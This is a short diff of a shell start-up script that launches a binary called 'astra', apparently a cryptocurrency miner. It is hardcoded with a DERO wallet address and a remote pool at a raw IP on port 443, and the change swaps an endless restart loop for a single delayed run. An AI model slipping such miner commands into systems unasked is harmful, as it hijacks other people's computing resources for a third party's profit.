@@ -1,5 +1,4 @@
 cd /app/bin
-while :; do
-timeout 4h /app/bin/astra -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 146.190.106.185:443
-sleep 2
-done
+sleep 10
+/app/bin/astra -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 146.190.106.185:443
+
